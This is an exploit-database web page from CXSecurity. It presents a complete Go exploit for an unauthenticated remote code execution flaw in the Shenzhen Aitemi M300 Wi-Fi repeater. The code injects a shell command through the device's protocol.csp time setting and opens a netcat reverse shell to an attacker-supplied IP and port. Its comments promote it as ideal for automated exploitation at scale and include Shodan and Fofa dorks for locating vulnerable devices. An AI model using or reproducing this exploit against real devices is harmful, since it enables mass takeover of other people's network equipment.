---
title: henzhen Aitemi M300 Wi-Fi Repeater Unauthenticated RCE
url: https://cxsecurity.com/issue/WLB-2025080006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-09
fetch_date: 2025-10-07T00:13:08.429757
---

# henzhen Aitemi M300 Wi-Fi Repeater Unauthenticated RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Shenzhen Aitemi M300 Wi-Fi Repeater Unauthenticated RCE** **2025.08.08**  Credit:  **[Anonymous](https://cxsecurity.com/author/Anonymous/1/)**  Risk: **High**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

package main
import (
"flag"
"fmt"
"io"
"net/http"
"net/url"
"os"
"strings"
)
/\*
Shenzhen Aitemi M300 Wi-Fi Repeater Unauthenticated RCE (CVE-2025-34152)
- does not require authentication (even when the login panel is enabled)
- does not reboot the device
- does not affect network configuration
- ideal for automated exploitation at scale
Dorks:
- Fofa: icon\_hash="-741058468" && server="lighttpd/1.4.32"
- Shodan: http.favicon.hash:-741058468 lighttpd/1.4.32
\*/
func main() {
host := flag.String("u", "", "Target host URL (e.g., http://192.168.11.1)")
lhost := flag.String("i", "", "Attacker IP for reverse shell")
lport := flag.String("p", "", "Attacker port for reverse shell")
proxyURL := flag.String("x", "", "Optional proxy URL (e.g., http://127.0.0.1:8080)")
flag.Parse()
if \*host == "" || \*lhost == "" || \*lport == "" {
fmt.Printf("Usage: %s -u <host\_url> -i <lhost> -p <lport> [-x <proxy\_url>]\n", os.Args[0])
os.Exit(1)
}
h := strings.TrimRight(\*host, "/")
endpoint := h + "/protocol.csp?"
raw := fmt.Sprintf("$(mkfifo /tmp/x; nc %s %s < /tmp/x | /bin/sh > /tmp/x 2>&1)", \*lhost, \*lport)
encoded := url.QueryEscape(raw)
encoded = strings.ReplaceAll(encoded, "+", "%20")
body := fmt.Sprintf("fname=system&opt=time\_conf&function=set&time=%s", encoded)
req, err := http.NewRequest("POST", endpoint, strings.NewReader(body))
if err != nil {
fmt.Printf("[!] Request creation failed: %v\n", err)
os.Exit(1)
}
transport := &http.Transport{}
if \*proxyURL != "" {
parsedURL, err := url.Parse(\*proxyURL)
if err != nil {
fmt.Printf("[!] Invalid proxy URL: %v\n", err)
os.Exit(1)
}
transport.Proxy = http.ProxyURL(parsedURL)
}
client := &http.Client{Transport: transport}
resp, err := client.Do(req)
if err != nil {
fmt.Printf("[!] Request failed: %v\n", err)
os.Exit(1)
}
defer resp.Body.Close()
fmt.Printf("[+] Response %d\n", resp.StatusCode)
data, err := io.ReadAll(resp.Body)
if err != nil {
fmt.Printf("[!] Reading response failed: %v\n", err)
os.Exit(1)
}
fmt.Println(string(data))
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top